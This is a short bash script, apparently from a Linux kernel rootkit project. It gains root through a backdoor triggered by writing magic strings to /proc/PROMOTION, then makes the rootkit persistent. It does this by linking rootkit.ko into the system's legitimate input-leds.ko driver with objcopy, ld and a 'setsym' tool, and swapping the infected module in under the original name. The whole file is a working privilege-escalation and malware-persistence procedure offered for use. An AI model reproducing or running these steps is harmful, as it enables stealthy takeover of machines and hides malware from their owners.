#!/usr/bin/env bash

# get root
# can not read /proc/kcore
id && file /proc/kcore
# now we can
printf '%s' try_promotion > /proc/PROMOTION && \
	printf '%s' AUTHME > /proc/PROMOTION && \
	id && \
	file /proc/kcore

# auto start by linking to the sys's input-leds.ko module
# cp the target module to current workdir & check the init and exit func
cp /lib/modules/$(uname -r)/kernel/drivers/input/input-leds.ko .
readelf -s input-leds.ko | grep -e grep -e input_leds_init -e input_leds_exit

# set the init and exit func to global & check if objcopy succeed
objcopy input-leds.ko inputleds.ko --globalize-symbol input_leds_init --globalize-symbol input_leds_exit
readelf -s inputleds.ko | grep -e grep -e input_leds_init -e input_leds_exit

# link the target module and malicous module together
ld -r inputleds.ko rootkit.ko -o infected.ko

# change the host's init_module/cleanup_module ->  rk_init/rk_exit, using a tool named 'setsym'
setsym infected.ko init_module $(setsym infected.ko rk_init)
setsym infected.ko cleanup_module $(setsym infected.ko rk_exit)

# rmmod the origin target module & insmod the linked one
rmmod input-leds.ko
insmod infected.ko
# if you want to rmmod the linked one, its name is the original
# e.g. rmmod input-leds.ko